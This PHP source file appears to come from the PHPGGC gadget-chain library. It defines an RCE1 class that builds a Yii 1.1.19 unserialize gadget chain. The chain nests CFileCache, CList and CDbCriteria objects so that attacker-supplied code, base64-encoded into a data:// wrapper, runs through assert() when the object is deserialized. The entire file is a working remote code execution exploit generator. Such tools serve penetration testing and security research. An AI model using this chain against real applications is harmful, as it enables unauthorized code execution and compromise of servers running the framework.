<?php

namespace GadgetChain\Yii;

class RCE1 extends \PHPGGC\GadgetChain\RCE
{
    public $version = '1.1.19';
    public $vector = '__wakeup';
    public $author = 'cf';
    public $informations = '
        As the payload uses file_get_contents("data://..."), allow_url_fopen
        must be ON.
    ';

    public function generate(array $parameters)
    {
    	// When hitting the file cache, our data:// wrapper will be fetched,
    	// and it will be unserialized with assert().
        $code = $parameters['code'];
        $code = '9999999999' . $code;
        $code = base64_encode($code);

        $a = new \CFileCache($code);
        $b = new \CList($a);
        $c = new \CDbCriteria($b);

        return $c;
    }
}
